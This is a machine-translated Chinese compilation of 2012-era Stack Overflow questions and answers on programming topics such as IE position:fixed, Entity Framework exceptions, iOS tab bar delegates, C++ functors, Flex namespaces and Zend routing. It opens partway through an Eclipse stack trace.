at org.eclipse.jdt.internal.ui.javaeditor.EditorUtility.openInEditor(EditorUtility.java:365)
at org.eclipse.jdt.internal.ui.javaeditor.EditorUtility.openInEditor(EditorUtility.java:168)
at org.eclipse.jdt.ui.actions.OpenAction.run(OpenAction.java:229)
at org.eclipse.jdt.ui.actions.OpenAction.run(OpenAction.java:208)
at org.eclipse.jdt.ui.actions.SelectionDispatchAction.dispatchRun(SelectionDispatchAction.java:274)
at org.eclipse.jdt.ui.actions.SelectionDispatchAction.run(SelectionDispatchAction.java:250)
at org.eclipse.jdt.internal.ui.packageview.PackageExplorerActionGroup.handleOpen(PackageExplorerActionGroup.java:373)
at org.eclipse.jdt.internal.ui.packageview.PackageExplorerPart$4.open(PackageExplorerPart.java:526)
at org.eclipse.ui.OpenAndLinkWithEditorHelper$InternalListener.open(OpenAndLinkWithEditorHelper.java:48)
at org.eclipse.jface.viewers.StructuredViewer$2.run(StructuredViewer.java:845)
at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:42)
at org.eclipse.ui.internal.JFaceUtil$1.run(JFaceUtil.java:49)
at org.eclipse.jface.util.SafeRunnable.run(SafeRunnable.java:175)
at org.eclipse.jface.viewers.StructuredViewer.fireOpen(StructuredViewer.java:843)
at org.eclipse.jface.viewers.StructuredViewer.handleOpen(StructuredViewer.java:1131)
at org.eclipse.jface.viewers.StructuredViewer$6.handleOpen(StructuredViewer.java:1235)
at org.eclipse.jface.util.OpenStrategy.fireOpenEvent(OpenStrategy.java:264)
at org.eclipse.jface.util.OpenStrategy.access$2(OpenStrategy.java:258)
at org.eclipse.jface.util.OpenStrategy$1.handleEvent(OpenStrategy.java:298)
at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
at org.eclipse.swt.widgets.Display.sendEvent(Display.java:3783)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1375)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1398)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1383)
at org.eclipse.swt.widgets.Widget.notifyListeners(Widget.java:1195)
at org.eclipse.swt.widgets.Display.runDeferredEvents(Display.java:3629)
at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3284)
at org.eclipse.ui.internal.Workbench.runEventLoop(Workbench.java:2640)
at org.eclipse.ui.internal.Workbench.runUI(Workbench.java:2604)
at org.eclipse.ui.internal.Workbench.access$4(Workbench.java:2438)
at org.eclipse.ui.internal.Workbench$7.run(Workbench.java:671)
at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:332)
at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:664)
at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:149)
at org.eclipse.ui.internal.ide.application.IDEApplication.start(IDEApplication.java:115)
at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)
at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:110)
at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:79)
at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:369)
at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:179)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:597)
at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:620)
at org.eclipse.equinox.launcher.Main.basicRun(Main.java:575)
at org.eclipse.equinox.launcher.Main.run(Main.java:1408) 
```

我看过许多有类似问题的帖子，但这些解决方案都不适合我。我尝试将渲染模式更改为各种不同版本的 android 操作系统，但无济于事。我也在 xml 中使用我的对象的完全限定路径。还有其他解决方案吗？这些是我发现最多的两个。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T18:28:31.850

您是否看到另一个标记为 的先前错误`"org.example.myView failed to instantiate."`？（当然，使用您自己的视图的类名。）这应该为您提供有关问题所在的更多详细信息。

# html - 对位置的跨浏览器支持：固定

> ID：10403355
> 
> 赞同：1
> 
> 时间：2012-05-01T19:48:21.113
> 
> 标签：html, css

是否有`position: fixed`所有主要浏览器都支持的可靠实施解决方案？

我为我最近的代码感到非常自豪，它解决了我在 FF 中的所有问题，直到我在 IE 中查看它。周围似乎有很多黑客，但其中一些似乎相互矛盾......

我需要在页面上相对于窗口定位几个元素。

这段代码在 FF 中运行良好，但在 IE 中却不行，甚至在 v.9 中也是如此。即使我滚动页面，该元素也应该固定在左上角。在 IE 中，它会随着页面内容向上滚动。

```
#myElement{
    left:0;
    top:0;
    position:fixed;
    height:35px;
    width:290px;
    background-color: #f5f5f5;
    z-index: 999
} 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:15:57.617

正如我所怀疑的，您使用的是无效的`DOCTYPE`，它将 IE 发送到*怪癖*模式。要使 IE 保持*标准*模式，您需要确保使用有效的`DOCTYPE`. 所以，如果你想使用 HTML 4.01 过渡，它应该是：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd"> 
```

但是，我会使用更短更简单的 HTML5 `DOCTYPE`：

```
<!DOCTYPE html> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T19:53:29.107

只有IE6不支持`position:fixed`，不是主流浏览器。（请参阅[此处](http://caniuse.com/#search=fixed)的浏览器支持。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:15:44.447

尝试使用 position:relative; 或位置：绝对；而不是位置：固定；这些在 IE9 中都有。但是，很多时候位置属性会产生不良结果，因此，我总是希望尽可能地避免它。也请检查 Chrome/Webkit。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-03-28T00:51:39.337

如果有人仍然有这个问题。

在样式表中输入以下内容。所有浏览器都会用 position:fixed 覆盖 position:absolute ，你会得到你想要的。IE 6 不理解 > 运算符，因此它永远不会看到 position:fixed 并使用 position:absolute。该网页可在所有浏览器中使用，但在 IE6 中不那么漂亮。

```
htmltag
    {position: absolute;}

body>htmltag
    {position:fixed;} 
```

# asp.net-mvc - .Net 在登录/传递用户的 GUID 后重定向到用户详细信息

> ID：10403359
> 
> 赞同：0
> 
> 时间：2012-05-01T19:48:36.813
> 
> 标签：asp.net-mvc, logging, guid

我正在使用 MVC 3 .Net 成员资格。这对我来说很新，一旦他们成功登录，我就会将用户重定向到他们的用户详细信息页面。这是登录控制器。我的用户详细信息操作期望将用户的 GUID 传递给它，但我不知道该怎么做。我试过User.id？和 Membershipt.GetUser() 等等，但我似乎无法获得用户详细信息操作所需的用户 GUID。有任何想法吗？提前致谢

```
[HttpPost]
    public ActionResult LogOn(LogOnModel model, string returnUrl)
    {
        if (ModelState.IsValid)
        {
            if (Membership.ValidateUser(model.UserName, model.Password))
            {
                FormsAuthentication.SetAuthCookie(model.UserName, model.RememberMe);
                if (Url.IsLocalUrl(returnUrl) && returnUrl.Length > 1 && returnUrl.StartsWith("/")
                    && !returnUrl.StartsWith("//") && !returnUrl.StartsWith("/\\"))
                {
                    return Redirect(returnUrl);
                }
                else
                {
                    return RedirectToAction("Details", "User", new { id = User.??????});
                }
            }
            else
            {
                ModelState.AddModelError("", "The user name or password provided is incorrect.");
            }
        }

        // If we got this far, something failed, redisplay form
        return View(model);
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T11:26:33.933

我通过快速搜索找到的只是问题，而不是解决方案或示例。虽然这本身并不意味着什么——我不熟悉“AccountModel”和“LogOnModel”命名空间以及相关的方法。但我仍然可以提供帮助。

第一个问题：GUID 存储在哪里？您使用的是目录 (AD/LDAP) 还是数据库 (SQL)。GUID 是“在那里”，如果它已经可以访问，它不会是类似于 model.GUID 的东西。您的 ValidateUser 找到了用户名，但它对 GUID“一无所知”。例如，当您获得有效的用户名和密码时，ADODB、Linq 和 DirectorySearcher 都有相对简单的方法来获取 GUID。

# ios - 我如何知道何时按下标签栏项目（iOS）

> ID：10403375
> 
> 赞同：1
> 
> 时间：2012-05-01T19:50:07.857
> 
> 标签：ios, cocoa-touch, ios5, uikit

我在情节提要中创建了 2 个视图控制器和一个标签栏控制器。

当按下相关的标签栏时，是否可以在 2 个视图控制器中的任何一个中执行方法？

我尝试了几种方法，但如果我想初始化 firstViewController 的对象，他们需要在 firstViewController 或 secondViewController 上使用 nib 名称，通常 firstViewController 只是在启动时创建，

任何帮助将不胜感激，我对 uitabcontroller 应用程序委托有点熟悉，但我不知道如何将两个视图控制器连接到选项卡控制器

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T19:53:46.877

看看`UITabViewController Delegate`：

> 当您想要增强选项卡栏的行为时，您可以使用**UITabBarControllerDelegate协议。**特别是，您可以使用它来确定是否应选择特定选项卡，在选择选项卡后执行操作，或者在用户自定义选项卡顺序之前或之后执行操作。在您的自定义对象中实现这些方法后，您应该将该对象分配给相应的**UITabBarController**对象的委托属性。
> 
> 该协议中的所有方法都是可选的。

**参考：http:** [//developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UITabBarControllerDelegate_Protocol/Reference/Reference.html](http://developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UITabBarControllerDelegate_Protocol/Reference/Reference.html)

* * *

你需要的应该可以通过实施来实现：

```
- (void)tabBarController:(UITabBarController *)tabBarController 
 didSelectViewController:(UIViewController *)viewController 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-11-10T15:26:54.657

如果您使用情节提要，请执行此操作

在 didFinishLaunchingWithOptions

```
UITabBarController *tabBar = (UITabBarController *)self.window.rootViewController;
[tabBar setDelegate:self]; 
```

接着

```
-(void) tabBarController:(UITabBarController *)tabBarController didSelectViewController:(UIViewController *)viewController
{
   //Write your code here
} 
```

# javascript - 当我改变它们的顺序时，元素“猛地”回到右边

> ID：10403378
> 
> 赞同：0
> 
> 时间：2012-05-01T19:50:18.560
> 
> 标签：javascript, jquery

我正在尝试创建一个无限滚动的元素，但还没有找到足够轻量级/足够强大的插件，所以我正在尝试创建自己的。

到目前为止，它运行良好，除了当我删除第一个元素并将其附加到父元素的末尾时动画中的轻微抖动。我抛出的示例也有一个问题，即由于某种原因元素丢失了填充，但这在我的实际代码中没有发生......

**小提琴：http:** [//jsfiddle.net/WtFWy/](http://jsfiddle.net/WtFWy/)

**使用示例标记：**

```
<section id="photos" class="bg-transparent-black">
    <div class="red"></div>
    <div class="blue"></div>
    <div class="green"></div>
</section>​

#photos{
    position:absolute;
    bottom:1em;
    width:100px;
    height:225px;
    padding:3px;
    overflow:hidden;
    white-space:nowrap;
}
#photos div{
    height:100%;
    width:50px;
    padding:3px;
    display:inline-block;
    position:relative;
    border:1px solid black;
}
.red{background:red;}
.blue{background:blue;}
.green{background:green;} 
```

​和 **JavaScript：**

```
scrollImages = function(){
                var photoArea = $('#photos');
                var children = photoArea.children();
                var firstChild = $(children[0])
                var firstOffset=firstChild.offset();
                if(document.elementLeft === false){
                    document.elementLeft = firstOffset.left;
                }
                if(document.elementWidth === false){
                    document.elementWidth=firstChild.outerWidth(true);
                }
                if(firstOffset.left < 0 && (Math.abs(firstOffset.left) > Math.abs(document.elementWidth))){
                    photoArea.append(firstChild);
                    firstChild.css('margin-left', 0 + 'px')
                    children = photoArea.children();
                    firstChild = $(children[0])
                    firstOffset=firstChild.offset();
                    document.elementLeft = firstOffset.left;
                    document.elementWidth=firstChild.outerWidth(true);
                }else{

                }
                document.elementLeft -= 1;
                firstChild.css('margin-left', document.elementLeft + 'px');
                t = setTimeout(scrollImages, 100);

            }
            document.elementLeft = false;
            document.elementWidth = false;
            var t = setTimeout(scrollImages, 500);
            $('#photos').mouseover(function(){clearTimeout(t)});
            $('#photos').mouseout(function(){scrollImages()})
        }); 
```

​</p>

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:04:02.647

如果您`padding: 3px`从`#photos`动画中删除，则可以正常工作。

# c# - .net 应用程序调用层次结构资源管理器？

> ID：10403385
> 
> 赞同：0
> 
> 时间：2012-05-01T19:50:35.933
> 
> 标签：c#, .net

是否有任何快捷方式或机制可以可视化整个 .net 应用程序的调用层次结构？这意味着往返调用的方法都在一个屏幕中，类似于可视化关系的 DBML 窗口。我知道 Visual Studio .net 的调用层次结构，并且有点懒于设置调试器和浏览整个应用程序。由于该应用程序本身就是一个非常大的项目，我需要它的视觉表示。

任何第三方应用程序也受到赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T19:55:14.117

您可以使用 RedGate 的[ANTS 性能分析器](http://www.red-gate.com/products/dotnet-development/ants-performance-profiler/)生成调用图……这会显示在执行期间进行的调用，而不是可以进行的调用。大多数代码分析工具应该能够显示这一点。

这里有几个人正在查看调用图：

[http://www.youtube.com/watch?v=sTfflRHYY80](http://www.youtube.com/watch?v=sTfflRHYY80)

* * *

[NDepend](http://www.ndepend.com/Default.aspx)将通过分析程序集和 pdb 文件向您显示可能的调用。

# jquery - Asp.Net MVC3 带必填字段验证

> ID：10403386
> 
> 赞同：1
> 
> 时间：2012-05-01T19:50:39.527
> 
> 标签：jquery, asp.net-mvc, asp.net-mvc-3

我创建了一个视图，其中我有一个文本框，我想在该文本框上放置必填字段验证。

```
@Html.TextBox("txtFirst", "", htmlAttributes: new {@maxlength="9"}) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T19:57:24.977

首先，我必须说在 MVC 中进行验证的最佳方法是将数据注释属性放在模型中的属性之上，如下所示：

```
[Required]
[StringLength(9)]
public string Foo {get; set;}

// This will force the validation in the client side.
@Html.TextBoxFor(m => m.Foo); 
```

这种方法的好处（除了它通常不那么写）它也可以在客户端和**服务器端**工作。

如果您想在视图中而不是`Model`出于某种原因在视图中进行验证，您只需将`required`类添加到文本框：

```
@Html.TextBox("txtFirst", "", htmlAttributes: new {@class = "required", maxlength="9"}) 
```

# c# - 为什么我在 System.Data.Entity.dll（实体框架）中收到 NullReferenceException？

> ID：10403390
> 
> 赞同：10
> 
> 时间：2012-05-01T19:50:52.633
> 
> 标签：c#, wpf, entity-framework

我有一个`List<State>`实体`State`对象，每个`State`对象都有其他对象的集合，例如`Licenses`, `Taxes`,`Bonds`等

还有一个集合 for `ExpiredObjects`，它是任何已过期且需要更新的对象的列表。出于某种原因，当我尝试在一个特定的州（内华达州）访问它时，这个属性给了我一个`NullReferenceException`提示，但我一生都无法弄清楚实际上是什么，`null`因为我在任何地方都看不到任何`null`值。

这是我的引发异常的代码。它遍历所有状态，并将所有状态添加`ExpiredObjects`到显示的特定于视图的集合中。我的测试代码仍然包括在内

```
 private List<ExpiredObject> LoadAllExpiredObjects()
    {
        var list = new List<ExpiredObject>();
        foreach (var state in States)
        {
            // This tells me the state is not null, and neither is state.ExpiredObjects
            Debug.WriteLine(string.Format("{0}|{1}|{2}", 
                state.Name, state == null, state.ExpiredObjects == null));

            try
            {
                var x = state.ExpiredObjects;
                Debug.WriteLine(x == null);

                // Exception occurs on the "for" line on the Nevada state only
                // Contents in for loop do not execute
                foreach (var item in x)
                {
                    Debug.WriteLine(string.Format("{0}", item));
                    list.Add(item);
                }

                // This used to be the only line of code before I started testing
                // It fails on Nevada
                //list.AddRange(state.ExpiredObjects);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Debug.WriteLine(ex.StackTrace);
            }
        }
        return list;
    } 
```

错误的堆栈跟踪是这样的：

```
A first chance exception of type 'System.NullReferenceException' occurred in System.Data.Entity.dll
Object reference not set to an instance of an object.
   at System.Data.EntityKey.AddHashValue(Int32 hashCode, Object keyValue)
   at System.Data.EntityKey.GetHashCode()
   at System.Collections.Generic.GenericEqualityComparer`1.GetHashCode(T obj)
   at System.Collections.Generic.Dictionary`2.FindEntry(TKey key)
   at System.Collections.Generic.Dictionary`2.TryGetValue(TKey key, TValue& value)
   at System.Data.Objects.ObjectStateManager.TryGetEntityEntry(EntityKey key, EntityEntry& entry)
   at System.Data.Common.Internal.Materialization.Shaper.HandleEntityAppendOnly[TEntity](Func`2 constructEntityDelegate, EntityKey entityKey, EntitySet entitySet)
   at lambda_method(Closure , Shaper )
   at System.Data.Common.Internal.Materialization.Coordinator`1.ReadNextElement(Shaper shaper)
   at System.Data.Common.Internal.Materialization.Shaper`1.SimpleEnumerator.MoveNext()
   at System.Data.Objects.DataClasses.RelatedEnd.Merge[TEntity](IEnumerable`1 collection, MergeOption mergeOption, Boolean setIsLoaded)
   at System.Data.Objects.DataClasses.EntityCollection`1.Load(List`1 collection, MergeOption mergeOption)
   at System.Data.Objects.DataClasses.EntityCollection`1.Load(MergeOption mergeOption)
   at System.Data.Objects.DataClasses.RelatedEnd.Load()
   at System.Data.Objects.DataClasses.RelatedEnd.DeferredLoad()
   at System.Data.Objects.DataClasses.EntityCollection`1.GetEnumerator()
   at MyNamespace.StatesViewModel.LoadAllExpiredObjects() in C:\Users\me\Desktop\MySolution\StatesViewModel.cs:line 217 
```

`DataGrid`当我选择 Nevada 并尝试将 a 绑定到集合时，我也会遇到完全相同的错误`ExpiredObjects`（如果我注释掉该绑定，则代码可以正常工作）

有谁知道可能导致此错误的原因？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-05-01T20:08:26.753

如果只针对内华达，那一定是数据问题，彻底检查数据库。

总而言之，核心问题是：

*   这是分贝优先。
*   ...正在为 EF 中标记为非空的字段之一返回空值

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-12-06T14:54:27.880

在模块化架构中多次意外加载模块时，我遇到了同样的问题。

此外，模块使用 2 个相同的副本`DbContext`，试图将一个实体从一个上下文连接到另一个上下文的另一个实体。

这掩盖了`InvalidOperationException`（不能在多个跟踪器中使用实体），这通常在没有模块内容的情况下发生。

花了我3个小时解决，也许它可以帮助有同样问题的人

# iphone - 对 ABPeoplePicker 进行 UI 更改

> ID：10403391
> 
> 赞同：2
> 
> 时间：2012-05-01T19:50:52.740
> 
> 标签：iphone, objective-c, ios, ipad

我正在模态地展示一个 ABPeoplePicker 实例，以允许我的用户从他们的联系人列表中选择人员。我想让他们一次选择多个联系人，所以我`return NO;`采用了这种方法：`- (BOOL)peoplePickerNavigationController:(ABPeoplePickerNavigationController *)peoplePicker shouldContinueAfterSelectingPerson:(ABRecordRef)person {`

当用户选择一个联系人时，除了我正在执行“保存”联系人以供以后使用的逻辑之外，我还想在联系人旁边放置一个复选标记以显示它已被选中。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-02T04:49:35.463

作为一般规则，您不应尝试修改 Apple 提供的任何视图控制器的 UI。当然，你也许可以将一些东西拼凑起来，让它工作，并实现你的目标，但是当 iOS 6 或 7 踩踏整个 UI 并破坏你的应用程序时会发生什么？出于这个原因，这样做*可能*会让你在进入 App Store 之前就被 Apple 拒绝。

所以，让我们从相反的角度来看这个问题。您需要一个允许在表格视图中使用复选标记来选择通讯簿联系人的 UI。为什么不创建那个表格视图？您可以使用通讯簿框架使用用户的通讯簿数据填充表格视图，从内置 UI 重新创建您需要的内容，但需要进行修改。查看[地址簿编程指南](http://developer.apple.com/library/ios/#DOCUMENTATION/ContactData/Conceptual/AddressBookProgrammingGuideforiPhone/Introduction.html)作为起点。

# shell - 在 shell 脚本中查找日期

> ID：10403396
> 
> 赞同：1
> 
> 时间：2012-05-01T19:51:05.270
> 
> 标签：shell

如何从以下输出（示例 1 和 2）中找到日期和位置并使用 Shell 脚本存储在文件或变量中。位置是固定的。

```
地址可以有以下位置和日期。

可供选择的位置：
ABC St, Main St, Ridge Pike

天数可供选择：
周一周二周三周四周五

```

```
输出样本 - 1
***********
订单 101
主街
周二
************

```

```
输出样本 - 2
***********
订单 110
山脊派克
星期五
************

```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T03:36:09.567

我们将调用您的程序`foo`

```
$ IFS=$'\n' read -d! _ location day < <(foo)

$ echo $location
Main St

$ echo $day
Tuesday 
```

# c++ - C ++将未知函数作为参数传递

> ID：10403400
> 
> 赞同：0
> 
> 时间：2012-05-01T19:51:17.947
> 
> 标签：c++

我的问题如下，我有一个函数将一个函数作为参数。问题是在某些情况下，传递的函数 fEval() 需要使用两个参数而不是一个作为 fEval(somevalue1,somevalue2) 来调用

```
Func(double (*fEval)(double F1),double min, double max,...)
{
    double value1 = fEval(10);

    // do something here

    double value2 = fEval(20,30);
} 
```

那么实现 Func 功能的正确方法是什么？我知道我也做不到

```
Func(double (*fEval)(double F1),double min, double max,...) 
```

或者

```
Func(double (*fEval)(double F1,double F2),double min, double max,...) 
```

谢谢 ！

好吧，让我重新表述一下这个问题。我需要创建一个函数，它可以将一个未知函数作为第一个参数、两个不同的值和一个参数列表。就像是

```
double Function(RandomFunction, val1, val2, ...); 
```

随机函数将是：

```
double Func1(double x)
{
    m_x = x;
    //Calling function
    // Set other things
}
double Func2(double x,double y)
{
    m_y = y;
    m_x = x;
    //Calling function
    // Set other things
} 
```

我会尝试这种仿函数方式，但我不确定这样做是否正确？它不需要我在可能调用的函数中重载 () 吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-01T19:53:57.577

你可能需要一个`operator()`重载的仿函数来接受一个或两个参数：

```
struct Functor {
    double operator()(double d) {
        ....
    }

    double operator()(double d1, double d2) {
        .... 
    }
};

void Func(Functor f, double min, double max, ...) {
    double value1 = f(10);

    // do something here

    double value2 = f(20, 30);
} 
```

除此之外（除了传递可变参数函数之外，这不好，因为它不知道是用一个还是两个参数调用它）我认为没有另一种好的方法来拥有一个可以接受的函数1个或2个参数。

正如评论中提到的 ildjarn ，您还可以将其设为模板，以便它可以采用任何类型的函子：

```
template<typename Functor_t>
void Func(Functor_t f, double min, double max, ...) {
    // same as above
} 
```

# apache-flex - Flex：在火花表中实施 TextInput 限制会产生错误

> ID：10403405
> 
> 赞同：0
> 
> 时间：2012-05-01T19:51:51.423
> 
> 标签：apache-flex

我正在创建一个 Flex 表，其中一列是可编辑的。我想将用户的输入限制为某些字符。下面的代码给出了一个`Could not resolve <s:itemEditor> to a component implementation`错误。有谁知道如何解决这个问题？

```
...
<fx:Array>
    <supportClasses:MyColumn ... />
    <supportClasses:MyColumn editable="true" ...>
        <s:itemEditor>
            <fx:Component>
                <s:TextInput restrict="0-9a-zA-Z"/> 
            </fx:Component>
        </s:itemEditor>
    </supportClasses:MyColumn>
    <supportClasses:MyColumn ... />
    ...
</fx:Array>
... 
```

其中 MyColumn 是一个类和函数，如下所示：

```
import spark.components.gridClasses.GridColumn;
public class MyColumn extends GridColumn
{
    ...
    public function MyColumn(headerText:String="header" width:Number=100 ...)
    {
       this.headerText=headerText;
       ...
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:57:44.893

[我在这篇博文](http://life.neophi.com/danielr/2007/01/could_not_resolve_to_a_compone.html)中找到了解决您问题的方法。

问题是当命名空间不匹配 (`supportClasses:`和`s:`) 时，mxml 编译器会感到困惑。修复非常简单：

```
<supportClasses:MyColumn editable="true" ...>
    <supportClasses:itemEditor>
        <fx:Component>
            <s:TextInput restrict="0-9a-zA-Z"/> 
        </fx:Component>
    </supportClasses:itemEditor>
</supportClasses:MyColumn> 
```

# c# - 从 TransparencyKey 中排除 PictureBox

> ID：10403415
> 
> 赞同：1
> 
> 时间：2012-05-01T19:52:32.767
> 
> 标签：c#, .net, winforms, transparency, picturebox

我有一个表单集 TransparencyKey = Color.White, backColor = Color.White 和一个 PictureBox，其中包含一个白色部分的图像。是否可以不让 PictureBox 在白色部分透明？

看图片
![在此处输入图像描述](../Images/9ec6b8bb6e67b7891bc24a4d7dfcff7f.png)

如果这是不可能的任何替代解决方案..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:10:36.120

如果这需要是 WinForms：

将文本更改为 255,255,254 或更改透明度键。我建议使用洋红色 (255,0,255) 来实现透明度，因为这是一种您不太可能需要显示的颜色。

如果你可以使用 WPF：

WPF 不仅支持开/关透明度。您可以将透明度与渐变、抗锯齿等一起使用。您需要做的就是将 Window 上的 AllowsTransparency 属性设置为 true，并为 Window 背景使用透明/半透明。

我认为在你的情况下最好的方法是让窗口的背景透明，并在它上面放置控件。您还可以使用 32bpp PNG 图像，因为它支持全范围的透明度。

# apache - 使用带有 Tomcat 和 ARR 的 IIS 7.5 重写 URL

> ID：10403416
> 
> 赞同：1
> 
> 时间：2012-05-01T19:52:34.403
> 
> 标签：apache, iis, tomcat

我试过搜索，但似乎无法得到我需要的答案。

我有一些由 IIS 管理的 web 服务。但是，我们需要在同一台服务器上托管运行在 Tomcat 上的 Web 应用程序。似乎解决方案是在 IIS 中创建一个服务器场，这在大多数情况下都有效。

我们通常用来访问运行在 Tomcat 上的应用程序的 url 是 localhost:8080。通过在 IIS 中设置服务器场，我设法让[http://localhost](http://localhost)重定向到同一个应用程序。但是，这会与另一个应用程序发生冲突，所以我想要一个像[http://localhost/Webapp/](http://localhost/Webapp/)这样的自定义路径来重定向到那里。我该如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T19:59:56.087

看起来您在 tomcat 上的应用程序是所谓的根应用程序。这是驻留在服务器根 url 下的应用程序。

您需要让应用程序在 url [http://localhost:8080/Webapp](http://localhost:8080/Webapp)下的 tomcat 上运行。为此，只需在上下文 Webapp 下安装应用程序。如何执行此操作取决于您的应用程序的安装方式。如果它是 tomcats webapp 文件夹中的文件夹，只需重命名此文件夹即可。如果它是由 tomcats conf 文件夹中的上下文定义 (ROOT.xml) 定义的，则将此上下文定义重命名为 Webapp.xml。

# android - 关于 AsyncTask 的一些问题

> ID：10403419
> 
> 赞同：2
> 
> 时间：2012-05-01T19:52:42.927
> 
> 标签：android, android-asynctask

据我了解，在 AsyncTask 中，只有*doInBackground*在其自己的任务中执行。所有其他方法 - 例如*onPostExecute* - 在 Activity 任务中执行。
是真的，*onPostExecute*和假设*onCofigurationChanged*实际上是同步的吗？

如果任务已完成或取消且不再被引用，系统是否会清理该任务？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:16:08.963

两者`onPostExecute`和`onConfigurationChanged`都在“UI线程”上执行，因此一个接一个地执行（以任何顺序）。每个应用程序有一个 UI 线程。

`AsyncTask`与任何 Java 对象一样，如果不再引用它，垃圾收集器最终会进行清理。

# jquery - 为用作 div 背景的图像重新配置 jquery 预加载

> ID：10403422
> 
> 赞同：0
> 
> 时间：2012-05-01T19:52:58.117
> 
> 标签：jquery, background, preloader

我正在使用这个基本的预加载器，它非常适合加载要在图像标签中使用的图像。但我想重新配置它以加载将用作 div 背景的图像，然后在加载图像时显示 div

```
(function($) {
var imgList = [];
$.extend({
preload: function(imgArr, option) {
    var setting = $.extend({
        init: function(loaded, total) {},
        loaded: function(img, loaded, total) {},
        loaded_all: function(loaded, total) {}
    }, option);
    var total = imgArr.length;
    var loaded = 0;

    setting.init(0, total);
    for(var i in imgArr) {
        imgList.push($("<img />")
            .attr("src", imgArr[i])
            .load(function() {
                loaded++;
                setting.loaded(this, loaded, total);
                if(loaded == total) {
                    setting.loaded_all(loaded, total);
                }
            })
        );
    }

}
});
})(jQuery);

$(function() {

$.preload([
    "img/someImage.png"
], {
    init: function(loaded, total) {
    },
    loaded: function(img, loaded, total) {
    },
    loaded_all: function(loaded, total) {
    }
});

}); 
```

可能使用图像的标题（不带扩展名）作为 div id 以使映射它们变得容易

```
<div id="someImage" style="display:none;"></div> 
```

# zend-framework - ZF 1 无法链接到 Route_Module 以获取 Id 字段

> ID：10403423
> 
> 赞同：0
> 
> 时间：2012-05-01T19:53:05.267
> 
> 标签：zend-framework, zend-route

我在 ZF 1 中有两个模块，一个是模块，另一个是初始应用程序本身我的问题是我需要在编辑与记录交互时在操作后提交一个 ID 动态编号。

下面的代码不起作用我不明白问题出在哪里......有什么想法或建议吗？ **不工作 = id 部分无法识别**

```
protected function _initRoutes()
    {
        $ctrl = Zend_Controller_Front::getInstance();

        $router = $ctrl->getRouter();

        $primary = new Zend_Controller_Router_Route_Module(
                array()
                ,$ctrl->getDispatcher()
                ,$ctrl->getRequest()
                );

        $secondary = new Zend_Controller_Router_Route(
                ':id', array( 'id' =>  "\d+" ) 
                );

        $primary->chain($secondary);

        $router->addRoute("default", $primary);
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T22:01:06.993

问题可能是模块路由最后包含标准通配符，它​​匹配键/值对（`:module/:controller/:action/*`），所以这个路由匹配你的整个 URL，并且由于第二个路由没有匹配，所以整体匹配失败。

通过在这里使用路由链接，你真的一无所获。最好只使用 Zend_Controller_Router_Route：

```
$route = new Zend_Controller_Router_Route(
    ':module/:controller/:action/:id',
    array(
        'module' => 'default',
        'controller' => 'index',
        'action' => 'index'
    ),
    array(
        'id' =>  "\d+"
    ) 
);
$router->addRoute('default', $route); 
```

# html - 从一个页面中提取数据以在另一个页面上填充信息。

> ID：10403426
> 
> 赞同：0
> 
> 时间：2012-05-01T19:53:17.233
> 
> 标签：html, database

我正在尝试创建一个数据库。假设汽车经销商一天结束，他们将取出 excel 并删除并输入诸如制造模型年份和里程之类的内容，这样他们就不必知道 html。

我想创建一个从 excel 文档中提取数据的页面。假设每辆车都有一个页面，并且有一个包含所有汽车的库存页面。两者都可以从数据库中提取以填充所有字段，他们所要做的就是交换图片并保持数据库最新。

我的问题：

1.  我应该将每个页面设置为从数据库中提取吗？
